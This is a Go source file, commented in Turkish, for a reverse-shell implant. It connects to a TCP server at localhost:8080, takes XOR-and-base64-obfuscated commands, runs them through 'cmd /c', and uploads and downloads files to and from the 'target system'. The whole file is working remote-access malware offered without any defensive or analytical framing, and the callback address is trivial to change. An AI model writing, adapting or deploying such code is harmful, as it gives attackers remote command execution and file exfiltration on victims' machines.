package main

import (
	"bufio"
	"encoding/base64"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
)

const secretKey = byte(0x5A)

func encryptAndEncode(plainText string, key byte) string {
	data := []byte(plainText)
	for i := 0; i < len(data); i++ {
		data[i] = data[i] ^ key
	}
	return base64.StdEncoding.EncodeToString(data) + "\n"
}

func decodeAndDecrypt(cipherText string, key byte) (string, error) {
	cipherText = strings.TrimSpace(cipherText)
	decoded, err := base64.StdEncoding.DecodeString(cipherText)
	if err != nil {
		return "", err
	}
	for i := 0; i < len(decoded); i++ {
		decoded[i] = decoded[i] ^ key
	}
	return string(decoded), nil
}

func main() {
	conn, err := net.Dial("tcp", "localhost:8080")
	if err != nil {
		return
	}
	defer conn.Close()

	sunucuOkuyucu := bufio.NewReader(conn)

	for {
		sifreliKomutSatiri, err := sunucuOkuyucu.ReadString('\n')
		if err != nil {
			break
		}

		komutSatiri, err := decodeAndDecrypt(sifreliKomutSatiri, secretKey)
		if err != nil {
			continue
		}

		if komutSatiri == "exit" {
			break
		}

		// --- DOSYA İNDİRME (DOWNLOAD) MANTIĞI ---
		if strings.HasPrefix(komutSatiri, "download ") {
			parcalar := strings.SplitN(komutSatiri, " ", 2)
			if len(parcalar) < 2 || parcalar[1] == "" {
				conn.Write([]byte(encryptAndEncode("Hata: Dosya adı eksik.", secretKey)))
				continue
			}
			dosyaAdi := parcalar[1]

			dosyaIcerik, err := os.ReadFile(dosyaAdi)
			if err != nil {
				conn.Write([]byte(encryptAndEncode("Hata: Dosya okunamadı: "+err.Error(), secretKey)))
				continue
			}

			b64Icerik := base64.StdEncoding.EncodeToString(dosyaIcerik)
			conn.Write([]byte(encryptAndEncode(b64Icerik, secretKey)))
			continue
		}

		// --- DOSYA YÜKLEME (UPLOAD) MANTIĞI ---
		if strings.HasPrefix(komutSatiri, "upload ") {
			// "upload <dosya_adı>|<b64_veri>" stringini ayıklıyoruz
			hamVeri := strings.TrimPrefix(komutSatiri, "upload ")
			parcalar := strings.SplitN(hamVeri, "|", 2)

			if len(parcalar) < 2 {
				conn.Write([]byte(encryptAndEncode("Hata: Bozuk yükleme paketi.", secretKey)))
				continue
			}
			dosyaAdi := parcalar[0]
			b64Icerik := parcalar[1]

			// Base64 veriyi tekrar byte dizisine çevir
			hamDosyaByte, err := base64.StdEncoding.DecodeString(b64Icerik)
			if err != nil {
				conn.Write([]byte(encryptAndEncode("Hata: Dosya decode edilemedi.", secretKey)))
				continue
			}

			// Hedef makinede dosyayı oluştur
			err = os.WriteFile(dosyaAdi, hamDosyaByte, 0644)
			if err != nil {
				conn.Write([]byte(encryptAndEncode("Hata: Dosya diske yazılamadı: "+err.Error(), secretKey)))
				continue
			}

			conn.Write([]byte(encryptAndEncode("[+] BAŞARILI: Dosya hedef sisteme yüklendi -> "+dosyaAdi, secretKey)))
			continue
		}

		// --- NORMAL KOMUT ÇALIŞTIRMA ---
		cmd := exec.Command("cmd", "/c", komutSatiri)
		çıktı, err := cmd.CombinedOutput()

		var cevap string
		if err != nil {
			cevap = "Hata: " + err.Error()
		} else if len(çıktı) == 0 {
			cevap = "[+] Komut basariyla yürütüldü (Cikti yok)."
		} else {
			cevap = string(çıktı)
		}

		conn.Write([]byte(encryptAndEncode(cevap, secretKey)))
		time.Sleep(30 * time.Millisecond)
	}
}
